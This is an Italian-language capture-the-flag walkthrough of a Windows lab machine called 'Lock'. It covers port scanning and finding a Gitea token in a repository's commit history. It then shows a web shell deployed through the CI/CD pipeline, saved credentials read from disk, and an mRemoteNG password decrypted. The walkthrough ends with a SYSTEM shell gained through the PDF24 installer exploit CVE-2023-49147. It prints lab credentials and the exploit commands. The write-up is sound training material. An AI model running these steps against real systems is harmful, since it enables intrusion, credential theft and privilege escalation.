# **Lock**

![Lock](./img/Lock.png)

## **Reconnainssance**
Si identificano le porte TCP aperte esposte dalla macchina target.
```bash
$ nmap -p- --min-rate 1000 10.x.x.x --open
```
```
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
3000/tcp open  ppp
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 103.56 seconds
```

Si raccolgono informazioni sui servizi esposti.
```bash
$ nmap -p80,445,3000,3389 -sCV 10.x.x.x
```
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Lock - Index
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=882c35d1654edc2e; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=pT18zRDSaEeuqMPJaN6STuwiswE6MTc2MjUyNzQ1NTc1MTg5MDAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 07 Nov 2025 14:57:36 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=9f638441fb9ed5ef; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=Gq_RmbiolgMzZJ2bjFc239eTu_06MTc2MjUyNzQ1NjY0Mzg1OTgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 07 Nov 2025 14:57:36 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-07T14:58:39+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-07T14:58:00+00:00
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2025-11-06T14:39:54
|_Not valid after:  2026-05-08T14:39:54
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=11/7%Time=690E08DF%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,3000,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=
SF:882c35d1654edc2e;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie
SF::\x20_csrf=pT18zRDSaEeuqMPJaN6STuwiswE6MTc2MjUyNzQ1NTc1MTg5MDAwMA;\x20P
SF:ath=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2007\x20Nov\x202025\x2014:57:36\x20G
SF:MT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-
SF:auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=device
SF:-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20c
SF:up\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:app
SF:lication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYS
SF:IsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfd
SF:XJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8v
SF:bG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmc
SF:iLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Metho
SF:d\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GE
SF:T\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x20no
SF:-transform\r\nSet-Cookie:\x20i_like_gitea=9f638441fb9ed5ef;\x20Path=/;\
SF:x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=Gq_RmbiolgMzZJ2bjF
SF:c239eTu_06MTc2MjUyNzQ1NjY0Mzg1OTgwMA;\x20Path=/;\x20Max-Age=86400;\x20H
SF:ttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20
SF:Fri,\x2007\x20Nov\x202025\x2014:57:36\x20GMT\r\nContent-Length:\x200\r\
SF:n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-07T14:58:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.87 seconds
```

I servizi esposti dalla macchina target sono:
- **Microsoft IIS** sulla porta **80/tcp**
- **SMB** sulla porta **445/tcp**
- **Gitea** sulla porta **3000/tcp**
- **Remote Desktop Protocol (RDP)** sulla porta **3389/tcp**

Si aggiorna il file /etc/hosts, aggiungendo un record per associare l'indirizzo IP della macchina con hostname e domain name.
```text
10.x.x.x LOCK lock
```

## **Information Gathering**
Tramite browser si interagisce con il web server esposto sulla porta 80 visitando l'URL **http://lock**

![01](./img/01.png)

Per ora non si individuano informazioni di particolare importanza.

Si visita l'URL **http://lock:3000** per interagire con il servizio Gitea.

![02](./img/02.png)

Si ha a che fare con **Gitea 1.21.3**.

Si esplora il portale per rovistare tra i repository.

![03](./img/03.png)

E tra gli utenti.

![04](./img/04.png)

Nel repository **/ellen.freeman/dev-scripts** è presente uno script Python **repos.py**.

`repos.py`

```python
import requests
import sys
import os

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)

    gitea_domain = format_domain(sys.argv[1])

    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
    if not personal_access_token:
        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
        sys.exit(1)

    try:
        repos = get_repositories(personal_access_token, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

Questo script Python semplice sfrutta l'API di Gitea **/api/v1/user/repos** per restituire la lista di repository di un determinato utente, e si utilizza un **access token** definito tra le variabili di ambiente.

Per il repository /ellen.freeman/dev-scripts sono presenti due commit, quindi si analizza la versione precedente a quella corrente e si individuano le differenze.

![06](./img/06.png)

- **Token:43ce39bb0bd6bc489284f2905f033ca467a6362f**

Si utilizza questo script per accedere ai repository.

```bash
$ python3 repos.py http://lock:3000
```
```
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```

Si può interagire con l'API di Gitea anche tramite **Swagger**.

![07](./img/07.png)

Si inserisce il **token** e si interroga l'API per accedere al repository **website**.

![08](./img/08.png)

Tra i meta data del repository sono presenti:
- Email: **ellen.freeman@lock.vl**
- Clone URL: **http://localhost:3000/ellen.freeman/website.git**

Si clona il repository sulla macchina Kali.
```bash
$ git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@lock:3000/ellen.freeman/website.git
```

![09](./img/09.png)

`readme.md`
```markdown
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```

Quindi, è presente un **CI/CD system** che con l'aggiornamento del repository, aggiorna anche il web server.

Si fa un tentativo.

`website/update.html`
```html
<html>
    <body>
        Hello!
    </body>
</html>
```

Si aggiorna il repository.
```bash
# Add the new file
$ git add update.html

# Add email and username
$ git config user.email "ellen.freeman@lock.vl"
$ git config user.name "ellen.freeman"

# Commit the changes
$ git commit -m "."

# Push
$ git push
```

Si verifica il risultato tramite l'API.
```bash
$ curl -X 'GET' \
  'http://lock:3000/api/v1/repos/ellen.freeman/website/contents/.?token=43ce39bb0bd6bc489284f2905f033ca467a6362f' \
    -H 'accept: application/json' | jq ".[] | .name"
```
```
"assets"
"changelog.txt"
"index.html"
"readme.md"
"update.html"
```

Dal browser si visita l'URL **http://lock/update.html**.

![10](./img/10.png)

Le modifiche del repository che vengono automaticamente propagate al web server permettono di caricare web page con codice arbitrario, come una **web shell**.

## **Web Shell**
Si utilizza la web shell del repository Github **/tennc/webshell/asp/** [https://github.com/tennc/webshell/blob/master/asp/webshell.asp](https://github.com/tennc/webshell/blob/master/asp/webshell.asp).

Si crea il file **webshell.aspx** e lo si carica nel repository.

Si visita l'URL **http://lock/webshell.aspx**

![11](./img/11.png)

Si raccolgono alcune informazioni:

```
> whoami

lock\ellen.freeman
```
```
> net user

User accounts for \\LOCK

-------------------------------------------------------------------------------
Administrator            DefaultAccount           ellen.freeman            
gale.dekarios            Guest                    WDAGUtilityAccount       
The command completed successfully.
```

Utenti:
- Administrator
- ellen.freeman
- gale.dekarios

```
> dir C:\Users\ellen.freeman

Directory of C:\Users\ellen.freeman

12/28/2023  11:36 AM    <DIR>          .
12/28/2023  06:14 AM    <DIR>          ..
12/28/2023  11:38 AM                52 .git-credentials
12/28/2023  11:35 AM               158 .gitconfig
12/27/2023  11:11 AM    <DIR>          .ssh
12/28/2023  05:58 AM    <DIR>          3D Objects
12/28/2023  05:58 AM    <DIR>          Contacts
12/28/2023  06:11 AM    <DIR>          Desktop
12/28/2023  05:59 AM    <DIR>          Documents
12/28/2023  05:58 AM    <DIR>          Downloads
12/28/2023  05:58 AM    <DIR>          Favorites
12/28/2023  05:58 AM    <DIR>          Links
12/28/2023  05:58 AM    <DIR>          Music
12/28/2023  05:58 AM    <DIR>          Pictures
12/28/2023  05:58 AM    <DIR>          Saved Games
12/28/2023  05:58 AM    <DIR>          Searches
12/28/2023  05:58 AM    <DIR>          Videos
               2 File(s)            210 bytes
              15 Dir(s)   5,667,536,896 bytes free
```
```
> type C:\Users\ellen.freeman\.git-credentials

http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000
```

Si ottengono le credenziali **ellen.freeman:YWFrWJk9uButLeqx** che ci permottono di accedere al profilo Gitea.

![12](./img/12.png)

Si analizza il file system.

```
> dir C:\

 Volume in drive C has no label.
 Volume Serial Number is 8592-A9D9

 Directory of C:\

12/27/2023  11:11 AM    <DIR>          Gitea
04/15/2025  04:56 PM    <DIR>          inetpub
11/07/2025  02:54 PM    <DIR>          Microsoft
05/08/2021  12:20 AM    <DIR>          PerfLogs
04/15/2025  04:24 PM    <DIR>          Program Files
12/28/2023  11:24 AM    <DIR>          Program Files (x86)
12/28/2023  06:14 AM    <DIR>          Users
08/07/2025  08:02 PM    <DIR>          Windows
               0 File(s)              0 bytes
```

Si visionano i programmi presenti nel sistema.
```
> dir C:\Progra~2
 Volume in drive C has no label.
 Volume Serial Number is 8592-A9D9

 Directory of C:\Program Files (x86)

12/28/2023  11:24 AM    <DIR>          .
05/08/2021  12:34 AM    <DIR>          Common Files
04/15/2025  04:56 PM    <DIR>          Internet Explorer
12/27/2023  10:26 AM    <DIR>          Microsoft
05/08/2021  12:34 AM    <DIR>          Microsoft.NET
12/28/2023  11:24 AM    <DIR>          Mozilla Maintenance Service
12/28/2023  05:39 AM    <DIR>          mRemoteNG
05/08/2021  01:35 AM    <DIR>          Windows Defender
04/15/2025  04:56 PM    <DIR>          Windows Mail
04/15/2025  04:56 PM    <DIR>          Windows Media Player
05/08/2021  01:35 AM    <DIR>          Windows NT
04/15/2025  04:56 PM    <DIR>          Windows Photo Viewer
05/08/2021  12:34 AM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              13 Dir(s)   5,640,474,624 bytes free
```

I file di configurazione di **mRemoteNG** potrebbero contenere delle credenziali.
```
> dir C:\Users\ellen.freeman\AppData\Roaming\mRemoteNG

Volume in drive C has no label.
 Volume Serial Number is 8592-A9D9

 Directory of C:\Users\ellen.freeman\AppData\Roaming\mRemoteNG

12/28/2023  05:59 AM    <DIR>          .
12/28/2023  05:58 AM    <DIR>          ..
12/28/2023  05:59 AM             3,341 confCons.xml
12/28/2023  05:58 AM               340 confCons.xml.20231228-0558390956.backup
12/28/2023  05:58 AM             3,242 confCons.xml.20231228-0558434222.backup
12/28/2023  05:58 AM             3,236 confCons.xml.20231228-0558502242.backup
12/28/2023  05:58 AM             3,249 confCons.xml.20231228-0558531392.backup
12/28/2023  05:58 AM             3,253 confCons.xml.20231228-0558577172.backup
12/28/2023  05:58 AM             3,341 confCons.xml.20231228-0559136449.backup
12/28/2023  05:59 AM             3,341 confCons.xml.20231228-0559140364.backup
12/28/2023  05:59 AM             3,341 confCons.xml.20231228-0559599708.backup
12/28/2023  05:59 AM                51 extApps.xml
12/28/2023  05:59 AM             2,014 mRemoteNG.log
12/28/2023  05:59 AM             2,246 pnlLayout.xml
12/28/2023  05:58 AM    <DIR>          Themes
              12 File(s)         30,995 bytes
               3 Dir(s)   5,639,294,976 bytes free
```

Si scarica il file **confCons.xml**.

`confCons.xml`
```
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="u5ojv17tIZ1H1ND1W0YqvCslhrNSkAV6HW3l/hTV3X9pN8aLxxSUoc2THyWhrCk18xWnWi+DtnNR5rhTLz59BBxo" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false"/>
</mrng:Connections>
```

E' presente la password per RDP dell'utente **gale.dekarios**.

Si utilizza lo script **mremoteng_decrypt.py** del repository [https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper](https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper) per tentare di decifrare a password con la chiave di default **mR3m**.
```bash
$ python3 mremoteng_decrypt.py -s 'LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw==' -p 'mR3m'
```
```
Password: ty8wnW9qCKDosXo6
```

Si accede tramite RDP con le credenziali **gale.dekarios:ty8wnW9qCKDosXo6** e al contenuto del file **user.txt**.

![13](./img/13.png)

Sulla macchina è presente il software **PDF24 Creator** per la creazione di file PDF. 

![14](./img/14.png)

La versione installata di **PDF24 Creator** è la **11.15.1**.

## **CVE-2023-49147**
PDF24 Creator 1.15.1 ha una vulnerabilità che permette una **Local Privilege Escalation** per mezzo di **MSI installer**. Il file di configurazione di PDF24 Creator MSI installer crea una finestra cmd.exe (temporanea) come SYSTEM user quando si utilizza la funzione repair di misexec.exe. 

> **Exploit for PDF24 Creator 11.15.1 Local Privilege Escalation CVE-2023-49147 di Sploitus** [https://sploitus.com/exploit?id=PACKETSTORM:176206](https://sploitus.com/exploit?id=PACKETSTORM:176206)

Per prima cosa si individua il file MSI installer per PDF24.

![15](./img/15.png)

Si utilzza il **SetOpLock.exe** di **/googleprojectzero/symboliclink-testing-tools** [https://github.com/googleprojectzero/symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools) per definire un lock su file **C:\Program Files\PDF24\faxPrnInst.log**. 

Il lock è necessario per bloccare il processo privilegiato **pdf24-PrinterInstall.exe** che dovrà scrivere sui log.

Si scarica sulla macchina target **SetOpLock.exe** [https://github.com/googleprojectzero/symboliclink-testing-tools/releases/tag/v1.0](https://github.com/googleprojectzero/symboliclink-testing-tools/releases/tag/v1.0):
```bash
$ 7z l Release.7z
```
```
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2015-12-07 17:13:33 ....A        11558         4192  LICENSE.txt
2017-03-24 14:21:14 ....A          836               README.txt
2017-03-24 14:20:30 ....A       132096       192627  BaitAndSwitch.exe
2017-03-24 14:20:32 ....A       116736               CreateDosDeviceSymlink.exe
2017-03-24 14:20:33 ....A       116224               CreateHardlink.exe
2017-03-24 14:20:30 ....A       116736               CreateMountPoint.exe
2017-03-24 14:20:30 ....A       120832               CreateNativeSymlink.exe
2017-03-24 14:20:32 ....A       118272               CreateNtfsSymlink.exe
2017-03-24 14:20:30 ....A       121344               CreateObjectDirectory.exe
2017-03-24 14:20:32 ....A       115200               CreateRegSymlink.exe
2017-03-24 14:20:30 ....A       129536               CreateSymlink.exe
2017-03-24 14:20:30 ....A       114176               DeleteMountPoint.exe
2017-03-24 14:20:30 ....A       112640               DumpReparsePoint.exe
2017-03-24 14:20:30 ....A       116224               SetOpLock.exe
------------------- ----- ------------ ------------  ------------------------
2017-03-24 14:21:14            1442410       196819  14 files
```

```bash
$ 7z e Release.7z SetOpLock.exe
```

![16](./img/16.png)

Si esegue l'exploit.

```powershell
# Run repair MSI installer
msiexec.exe /fa C:\_install\pdf24-creator-11.14.0-x64.msi  

# Set immediatly the opportunistic lock to faxPrnInst.log
.\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r  
```

![17](./img/17.png)

Il blocco di **pdf24-PinterInstall.exe**.

![18](./img/18.png)

Si avvia una shell privilegiata:

![19](./img/19.png)

![20](./img/20.png)

![21](./img/21.png)

Si apre una shell dal browser Firefox (Ctrl+o).

![22](./img/22.png)

![23](./img/23.png)

Si accede al file **root.txt**.

![24](./img/24.png)

---
